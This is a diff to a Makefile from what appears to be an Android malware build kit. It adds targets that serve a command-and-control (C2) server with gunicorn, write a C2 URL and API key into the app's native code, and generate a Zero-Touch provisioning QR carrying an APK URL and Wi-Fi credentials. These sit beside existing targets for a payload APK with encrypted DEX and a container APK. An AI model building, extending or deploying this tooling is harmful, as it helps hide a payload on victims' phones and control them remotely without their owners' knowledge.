@@ -20,6 +20,9 @@ help:
 	@echo "  make payload    — build payload APK + encrypt DEX"
 	@echo "  make apk        — build container APK"
 	@echo "  make c2         — start C2 (docker)"
+	@echo "  make serve      — run C2 locally (gunicorn, same cmd as Render)"
+	@echo "  make config     — regenerate native C2 config (C2_URL=... API_KEY=...)"
+	@echo "  make qr         — generate Zero-Touch provisioning QR"
 	@echo "  make zip        — package everything"
 	@echo "  make all        — keystore + payload + apk + zip"
 	@echo "  make clean      — remove build/"
@@ -56,6 +59,22 @@ apk:
 .PHONY: c2
 c2:
 	cd $(C2_DIR) && docker compose up -d --build
+
+.PHONY: serve
+serve:
+	@echo "[+] C2 on http://0.0.0.0:8000"
+	cd $(C2_DIR) && PORT=8000 gunicorn --chdir . --bind 0.0.0.0:$$PORT --workers 1 app:app
+
+.PHONY: config
+config:
+	@test -n "$(C2_URL)" || (echo "usage: make config C2_URL=https://... API_KEY=sk-..."; exit 1)
+	python3 tools/gen_c2_config.py "$(C2_URL)" "$(API_KEY)" --write
+	@echo "[+] native C2 config updated → android/app/src/main/cpp/native-lib.cpp"
+
+.PHONY: qr
+qr:
+	python3 wizard/zero-touch-qr.py --apk-url "$(APK_URL)" --wifi-ssid "$(WIFI_SSID)" \
+		--wifi-pass "$(WIFI_PASS)" --out build/provision-qr.png
 
 .PHONY: zip
 zip:
